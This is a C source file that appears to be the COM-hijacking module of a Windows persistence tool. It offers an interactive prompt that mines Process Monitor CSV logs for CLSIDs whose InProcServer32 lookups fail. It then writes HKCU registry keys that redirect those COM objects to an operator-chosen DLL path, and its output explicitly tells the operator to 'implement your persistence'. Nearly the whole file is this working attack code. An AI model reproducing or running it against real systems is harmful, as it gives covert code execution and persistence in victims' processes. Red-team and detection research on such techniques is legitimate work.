#include "persys.h"

void	ComHijackHelp()
{
	printf("\n- 'find' {CSV} : search for hijackable COM objects on procmon CSV extract file.\n"\
		"- 'info' {CLSID} : show information regarding the specified CLSID.\n"\
		"- 'hijack' {CLSID} : hijack a specific COM object by specifing its CLSID. \n"\
		"- 'quit' : quit this module\n\n");
}

wchar_t* ltrimW(wchar_t* str)
{
	while (*str == L' ' || *str == L'\t')
		str++;
	return str;
}

wchar_t* rtrimW(wchar_t* str)
{
	wchar_t* back;

	back = str + wcslen(str) - 1;
	while (*back == L' ' || *back == L'\t')
		back--;
	*(back + 1) = '\0';
	return str;
}

wchar_t* trimW(wchar_t* s)
{
	return rtrimW(ltrimW(s));
}

void	PrintClsidValues(wchar_t* clsid)
{
	HKEY	hKeyHkcr;

	wchar_t	regKeyPath[MAX_PATH];
	wchar_t* lpValueName;
	DWORD	lpcchValueName = 0;
	wchar_t	lpData[MAX_PATH];
	DWORD lpcbData = MAX_PATH;
	DWORD	lpType;
	BOOL	end = FALSE;
	LSTATUS ret;

	wmemset(regKeyPath, 0, MAX_PATH);
	wmemset(lpData, 0, MAX_PATH);
	wcscat(regKeyPath, L"\\CLSID\\");
	wcscat(regKeyPath, clsid);
	wcscat(regKeyPath, L"\\InprocServer32");
	if (RegOpenKeyExW(HKEY_CLASSES_ROOT, regKeyPath,
		0, KEY_QUERY_VALUE, &hKeyHkcr) == ERROR_SUCCESS)
	{
		lpValueName = malloc(sizeof(wchar_t) * MAX_REGVALUENAME_LEN);
		if (lpValueName)
		{
			wprintf(L"\n\t[i] Retrieving %ls information...\n", clsid);
			for (int i = 0; end != TRUE; i++)
			{
				lpcbData = MAX_PATH;
				lpcchValueName = MAX_REGVALUENAME_LEN;
				ret = RegEnumValueW(hKeyHkcr, i, lpValueName, &lpcchValueName,
					NULL, &lpType, (LPBYTE)lpData, &lpcbData);
				if (wcslen(lpValueName) != 0)
					wprintf(L"\t\t(%ls) => %ls\n", lpValueName, lpData);
				else
					wprintf(L"\t\t(Default) => %ls\n", lpData);
				if (ret == ERROR_NO_MORE_ITEMS)
					end = TRUE;
			}
			free(lpValueName);
		}
		RegCloseKey(hKeyHkcr);
	}
}

BOOL	InfoClsid(wchar_t* cmd)
{
	HKEY	hKeyHkcr;
	wchar_t lpName[MAX_REGKEY_LEN];
	DWORD	lpcchName;
	wchar_t	regKeyPath[MAX_PATH];
	BOOL	end = FALSE;
	LSTATUS ret;

	cmd += wcslen(L"find");
	cmd = trimW(cmd);
	wmemset(lpName, 0, MAX_REGKEY_LEN);
	wmemset(regKeyPath, 0, MAX_PATH);
	if (IsValidClsid(cmd) == TRUE)
	{
		if (RegOpenKeyExW(HKEY_CLASSES_ROOT, L"\\CLSID",
			0, KEY_ENUMERATE_SUB_KEYS, &hKeyHkcr) == ERROR_SUCCESS)
		{
			for (int i = 0; end != TRUE; i++)
			{
				lpcchName = MAX_REGKEY_LEN;
				ret = RegEnumKeyExW(hKeyHkcr, i, lpName, &lpcchName, NULL, NULL, NULL, NULL);
				if (wcsicmp(lpName, cmd) == 0)
				{
					PrintClsidValues(cmd);
					RegCloseKey(hKeyHkcr);
					return TRUE;
				}
				if (ret == ERROR_NO_MORE_ITEMS)
					end = TRUE;
				wmemset(lpName, 0, MAX_REGKEY_LEN);
			}
			RegCloseKey(hKeyHkcr);
		}
	}
	else
		fwprintf(stderr, L"Error : CLSID (%ls) not found.\n", cmd);
	return FALSE;
}

BOOL	IsValidClsid(wchar_t* clsid)
{
	HKEY	hKeyHkcr;
	wchar_t lpName[MAX_REGKEY_LEN];
	DWORD	lpcchName = 0;
	BOOL	end = FALSE;
	LSTATUS ret;

	wmemset(lpName, 0, MAX_REGKEY_LEN);
	if (RegOpenKeyExW(HKEY_CLASSES_ROOT, L"\\CLSID",
		0, KEY_ENUMERATE_SUB_KEYS, &hKeyHkcr) == ERROR_SUCCESS)
	{
		for (int i = 0; end != TRUE; i++)
		{
			lpcchName = MAX_REGKEY_LEN;
			ret = RegEnumKeyExW(hKeyHkcr, i, lpName, &lpcchName,
				NULL, NULL, NULL, NULL);
			if (wcsicmp(lpName, clsid) == 0)
			{
				RegCloseKey(hKeyHkcr);
				return TRUE;
			}
			if (ret == ERROR_NO_MORE_ITEMS)
				end = TRUE;
			wmemset(lpName, 0, MAX_REGKEY_LEN);
		}
		RegCloseKey(hKeyHkcr);
	}
	return FALSE;
}

BOOL	CreateClsidKeyInHkcu(wchar_t* clsid, wchar_t* path)
{
	LSTATUS	ret;
	wchar_t RegKeyPath[MAX_PATH];
	HKEY hKey;
	HKEY hKeyHklm;
	HKEY hKeyHkcu;

	BOOL	end = FALSE;
	wchar_t data[MAX_PATH];
	wchar_t* lpValueName;
	DWORD	lpcchValueName = MAX_REGVALUENAME_LEN;
	DWORD	lpcbData = MAX_PATH;

	wmemset(RegKeyPath, 0, MAX_PATH);
	wcscat(RegKeyPath, L"Software\\Classes\\CLSID\\");
	wcscat(RegKeyPath, clsid);

	ret = RegCreateKeyExW(HKEY_CURRENT_USER, RegKeyPath, 0,
		NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey,
		NULL);
	if (ret == ERROR_SUCCESS)
	{
		wcscat(RegKeyPath, L"\\InprocServer32");
		ret = RegCreateKeyExW(HKEY_CURRENT_USER, RegKeyPath, 0,
			NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey,
			NULL);
		if (ret == ERROR_SUCCESS)
		{
			lpValueName = malloc(MAX_REGVALUENAME_LEN * sizeof(wchar_t));
			if (lpValueName != NULL)
			{
				if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, RegKeyPath,
					0, KEY_READ, &hKeyHklm) == ERROR_SUCCESS)
				{
					if (RegOpenKeyExW(HKEY_CURRENT_USER, RegKeyPath,
						0, KEY_SET_VALUE, &hKeyHkcu) == ERROR_SUCCESS)
					{
						for (int i = 0; end != TRUE; i++)
						{
							wmemset(data, 0, MAX_PATH);
							wmemset(lpValueName, 0, MAX_REGVALUENAME_LEN);
							lpcchValueName = MAX_REGVALUENAME_LEN;
							lpcbData = MAX_PATH;
							ret = RegEnumValueW(hKeyHklm, i, lpValueName, &lpcchValueName,
								NULL, NULL, (LPBYTE)data, &lpcbData);
							if (ret == ERROR_NO_MORE_ITEMS)
								end = TRUE;
							if (wcslen(lpValueName) > 0)
								ret = RegSetValueExW(hKeyHkcu, lpValueName, 0,
									REG_SZ, (LPBYTE)data, (wcslen(data) + 1) *
									sizeof(wchar_t));
							else
								ret = RegSetValueExW(hKeyHkcu, NULL, 0,
									REG_SZ, (LPBYTE)path, (wcslen(path) + 1) *
									sizeof(wchar_t));
							if (ret != ERROR_SUCCESS)
								return FALSE;
						}
						free(lpValueName);
						RegCloseKey(hKeyHklm);
						RegCloseKey(hKeyHkcu);
						return TRUE;
					}
				}
				else
					fprintf(stderr, "Error : opening HKLM\n");
			}
		}
	}
	return FALSE;
}

void	HijackCLSID(wchar_t* clsid, S_args* params)
{
	clsid = clsid + wcslen(L"hijack");
	clsid = trimW(clsid);
	if (IsValidClsid(clsid))
	{
		if (CreateClsidKeyInHkcu(clsid, params->filePath) == FALSE)
			fprintf(stderr, "Error : CLSID creation in HKCU.\n");
	}
	else
		fprintf(stderr, "Error : invalid CLSID.\n");
}

BOOL	ComObjNotFound(char* procmonevent)
{
	if (strstr(procmonevent, "RegOpenKey") != NULL &&
		strstr(procmonevent, "NAME NOT FOUND") != NULL &&
		strstr(procmonevent, "InProcServer32") != NULL)
	{
		return TRUE;
	}
	return FALSE;
}

char* GetClsidFromRegPath(char* path)
{
	char* clsid;
	int	pos = 0;

	clsid = malloc(sizeof(char) * MAX_CLSID_LEN + 1);
	if (clsid != NULL)
	{
		while (path[pos] != '\0')
		{
			if (path[pos] == '{')
			{
				for (int i = 0; i < MAX_CLSID_LEN &&
					path[pos] != '\0'; i++)
				{
					clsid[i] = path[pos];
					pos++;
				}
			}
			pos++;
		}
		clsid[MAX_CLSID_LEN] = '\0';
	}
	else
		fprintf(stderr, "Error : memory allocation.\n");
	return clsid;
}

BOOL	IsInLst(S_lcom** head, char* regPath, char* processName)
{
	S_lcom* current;

	current = *head;
	while (current != NULL)
	{
		if ((StrStrI(regPath, current->clsid) != NULL) &&
			(stricmp(processName, current->processName) == 0))
			return TRUE;
		current = current->next;
	}
	return FALSE;
}

void	AddFirstComToLst(S_lcom** head, char* regPath, char* processName)
{
	*head = malloc(sizeof(S_lcom));
	if (*head != NULL)
	{
		(*head)->processName = strdup(processName);
		(*head)->clsid = strdup(GetClsidFromRegPath(regPath));
		(*head)->next = NULL;
	}
}

void	AddComToLst(S_lcom** head, char* regPath, char* processName)
{
	S_lcom* current;
	BOOL	exist = FALSE;

	if (*head != NULL)
	{
		exist = IsInLst(head, regPath, processName);
		if (exist == FALSE)
		{
			current = *head;
			while (current->next != NULL)
				current = current->next;
			current->next = malloc(sizeof(S_lcom));
			if (current->next != NULL)
			{
				current->next->processName = strdup(processName);
				current->next->clsid = GetClsidFromRegPath(regPath);
				current->next->next = NULL;
			}
		}
	}
	else
		AddFirstComToLst(head, regPath, processName);
}

void	AnalyzeEvent(char* event, S_lcom** head)
{
	char* token;
	int	pos = 0;
	char* processName = NULL;
	char* regPath = NULL;

	if (ComObjNotFound(event))
	{
		token = strtok(event, ",");
		while (token != NULL)
		{
			if (pos == 2)
				processName = token;
			else if (pos == 5)
				regPath = token;
			token = strtok(NULL, ",");
			pos++;
		}
		if (processName != NULL && regPath != NULL)
		{
			PathUnquoteSpaces(processName);
			PathUnquoteSpaces(regPath);
			if (strlen(processName) > 0 && strlen(regPath) > 0)
				AddComToLst(head, regPath, processName);
		}
	}
}

void	FreeComLst(S_lcom* head)
{
	S_lcom* tmp;

	while (head != NULL)
	{
		tmp = head;
		free(tmp->clsid);
		free(tmp->processName);
		head = head->next;
		free(tmp);
	}
}

void	ShowHijackableComObj(S_lcom* head)
{
	S_lcom* current;

	current = head;
	while (current->next != NULL)
	{
		printf("\t%s\t- %s\n", current->clsid, current->processName);
		current = current->next;
	}
	printf("\nType 'hijack' {CLSID} to implement your persistence.\n\n");
	FreeComLst(head);
}

void	ParseProcmonCsv(FILE* f)
{
	char	buffer[BUFFLINE];
	S_lcom* head = NULL;

	printf("\nProcessing procmon events...\n\n");
	while (fgets(buffer, BUFFLINE, f) != NULL)
		AnalyzeEvent(buffer, &head);
	ShowHijackableComObj(head);
	fclose(f);
}

void	OpenProcmonCsv(wchar_t* path)
{
	DWORD	dwAttrib;
	HANDLE	h;
	int		handle;
	FILE* fp;

	path = path + wcslen(L"find");
	path = trimW(path);
	if (wcslen(path) > 0)
	{
		PathUnquoteSpacesW(path);
		dwAttrib = GetFileAttributesW(path);
		if (dwAttrib == INVALID_FILE_ATTRIBUTES ||
			dwAttrib == FILE_ATTRIBUTE_DIRECTORY)
			fwprintf(stderr, L"Error : opening the file (%ls)\n\n", path);
		else
		{
			h = CreateFileW(path, GENERIC_READ, 0,
				NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (h != INVALID_HANDLE_VALUE)
			{
				handle = _open_osfhandle((intptr_t)h, _A_RDONLY);
				if (handle != 0)
				{
					fp = _wfdopen(handle, L"r");
					if (fp != NULL)
						ParseProcmonCsv(fp);
					else
						fwprintf(stderr, L"Error : opening the file (%ls)\n\n", path);
				}
				else
					fwprintf(stderr, L"Error : opening the file (%ls)\n\n", path);
				CloseHandle(h);
			}
			else
				fwprintf(stderr, L"Error : opening the file (%ls)\n\n", path);
		}
	}
}

void	ParseArgs(wchar_t* cmd, S_args* params)
{
	cmd[wcslen(cmd) - 1] = '\0';
	cmd = trimW(cmd);

	if (wcsncmp(L"find ", cmd, 5) == 0)
		OpenProcmonCsv(cmd);
	else if (wcsncmp(L"hijack ", cmd, 7) == 0)
		HijackCLSID(cmd, params);
	else if (wcsncmp(L"help", cmd, 4) == 0)
		ComHijackHelp();
	else if (wcsncmp(L"info ", cmd, 5) == 0)
		InfoClsid(cmd);
	else
		printf("Error : type 'help' for the list of options.\n\n");
}

void	ComHijacking(S_args* params)
{
	wchar_t	buffer[SIZE_BUFFER];
	BOOL	persistence_ok = FALSE;

	wmemset(buffer, 0, SIZE_BUFFER);
	printf("\n[*] Starting ComHijacking module...\n");
	while (wcsicmp(buffer, L"quit\n") != 0 &&
		persistence_ok == FALSE)
	{
		wmemset(buffer, 0, SIZE_BUFFER);
		printf("COM Hijack> ");
		fgetws(buffer, SIZE_BUFFER, stdin);
		if (wcsicmp(buffer, L"\n") != 0 &&
			wcsicmp(buffer, L"quit\n") != 0)
			ParseArgs(buffer, params);
	}
}